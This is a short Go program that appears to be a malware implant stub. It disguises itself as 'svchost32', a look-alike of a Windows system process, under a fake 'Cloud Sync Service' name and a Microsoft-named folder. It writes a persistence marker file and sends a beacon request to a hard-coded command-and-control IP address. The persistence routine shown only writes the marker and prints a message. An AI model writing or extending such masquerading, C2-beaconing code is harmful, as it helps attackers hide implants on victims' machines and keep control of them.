package main

import (
	"fmt"
	"net/http"
	"os"
	"path/filepath"
)

const (
	ServiceName        = "svchost32"
	ServiceDisplayName = "Cloud Sync Service"
	ServiceDescription = "Synchronizes files with the cloud storage provider"
	InstallPath        = `AppData\Local\Microsoft\svchost32\svchost32.exe`
	MarkerFileMid      = ".svchost32mid"
	MarkerFileUl       = ".svchost32ul"
	C2Address          = "192.142.52.31:443"
)

func installPersistence() {
	target := filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "svchost32", "svchost32.exe")
	marker := filepath.Join(filepath.Dir(target), MarkerFileMid)
	os.WriteFile(marker, []byte("installed"), 0644)
	fmt.Printf("Installed service %s (%s) at %s\n", ServiceName, ServiceDisplayName, target)
}

func beacon() {
	http.Get("https://" + C2Address + "/api/v1/ping")
}

func main() {
	installPersistence()
	beacon()
}
